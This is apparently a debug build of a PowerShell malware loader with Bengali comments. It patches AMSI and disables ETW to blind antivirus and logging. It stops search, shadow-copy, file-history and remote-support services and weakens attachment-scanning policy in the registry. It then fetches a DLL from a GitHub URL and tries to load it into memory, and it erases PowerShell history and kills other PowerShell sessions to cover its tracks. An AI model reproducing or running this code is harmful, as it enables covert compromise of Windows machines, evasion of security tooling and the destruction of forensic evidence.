# ============================================================
#  ★★★ AMSI + ETW বাইপাস ★★★
# ============================================================
Write-Host "[1] Bypassing AMSI & ETW..." -ForegroundColor Cyan
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    $a.GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
    $scanBuffer = $a.GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
    if ($scanBuffer) {
        $ptr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($scanBuffer)
        [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x31C0C3)
    }
    Write-Host "[+] AMSI Bypass Done" -ForegroundColor Green
} catch { Write-Host "[-] AMSI Bypass Failed" -ForegroundColor Red }

try {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Etw {
        [DllImport("ntdll.dll")] static extern int RtlSetProcessTraceFlags(IntPtr ProcessHandle, int Flags);
        public static void Off() {
            IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle;
            RtlSetProcessTraceFlags(p, 0);
        }
    }
"@ -IgnoreWarnings
    [Etw]::Off()
    Write-Host "[+] ETW Bypass Done" -ForegroundColor Green
} catch { Write-Host "[-] ETW Bypass Failed" -ForegroundColor Red }

# ============================================================
#  ★★★ (ডিবাগের জন্য) কনসোল হাইড করছি না, খোলা থাকবে ★★★
# ============================================================
Write-Host "[2] Console window will stay visible for debugging." -ForegroundColor Cyan

# ============================================================
#  ★★★ মূল main.ps1-এর সার্ভিস স্টপ ও রেজিস্ট্রি ★★★
# ============================================================
Write-Host "[3] Stopping services and applying registry..." -ForegroundColor Cyan
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -ErrorAction SilentlyContinue | Out-Null
Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewerService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null
Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
Write-Host "[+] Services and registry done." -ForegroundColor Green

# ============================================================
#  ★★★ ৪. DLL ডাউনলোড ও লোড (এখন এরর দেখাবে) ★★★
# ============================================================
Write-Host "[4] Downloading DLL from GitHub..." -ForegroundColor Cyan
try {
    $url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
    $bytes = (New-Object System.Net.WebClient).DownloadData($url)
    Write-Host "[+] Download complete. Size: $($bytes.Length) bytes" -ForegroundColor Green

    Write-Host "[*] Attempting to load with [System.Reflection.Assembly]::Load()..." -ForegroundColor Yellow
    # এই লাইনটি যদি নেটিভ DLL হয়, তবে ব্যর্থ হবে এবং Catch ব্লকে যাবে
    $loadedAssembly = [System.Reflection.Assembly]::Load($bytes)
    
    # যদি সফল হয় (মানে এটি .NET DLL ছিল)
    Write-Host "[+] SUCCESS! DLL Loaded in current PowerShell memory!" -ForegroundColor Green
    Write-Host "[+] Assembly Name: $($loadedAssembly.FullName)" -ForegroundColor Green
} catch {
    Write-Host "[!] FAILED to load DLL!" -ForegroundColor Red
    Write-Host "[!] Error Message: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Full Error Details: $($_.Exception.ToString())" -ForegroundColor Red
    Write-Host ""
    Write-Host "========================================================" -ForegroundColor Cyan
    Write-Host "⚠️  কারনটা বুঝুন: Assembly.Load() শুধু .NET DLL লোড করে।" -ForegroundColor Yellow
    Write-Host "   আপনার 'version.dll' ফাইলটি নেটিভ (C/C++) DLL হলে এটি" -ForegroundColor Yellow
    Write-Host "   কখনোই লোড হবে না। এটি BadImageFormatException দেবে।" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "🔧 সমাধান: নেটিভ DLL মেমরিতে রান করাতে MUST Manual Mapping করতে হবে।" -ForegroundColor Magenta
    Write-Host "   (যেটা আপনি 'Without Manual Mapping' বলেছিলেন, কিন্তু সেটা") -ForegroundColor Magenta
    Write-Host "   নেটিভ DLL-এর জন্য টেকনিক্যালি অসম্ভব।" -ForegroundColor Magenta
    Write-Host "========================================================" -ForegroundColor Cyan
}

# ============================================================
#  ★★★ ট্রেস ক্লিয়ার (পূর্বের মতো) ★★★
# ============================================================
Write-Host "[5] Clearing traces..." -ForegroundColor Cyan
Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
}

Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
# (conhost কিল দেওয়া হচ্ছে না, যাতে ডিবাগ দেখা যায়)
Write-Host "[+] Trace clearing done." -ForegroundColor Green

# ============================================================
#  ★★★ এক্সিট নয়, বরং অপেক্ষা করবে ★★★
# ============================================================
Write-Host ""
Write-Host "🛑 Script execution finished. Check the logs above." -ForegroundColor Cyan
Read-Host "Press ENTER to close this window"
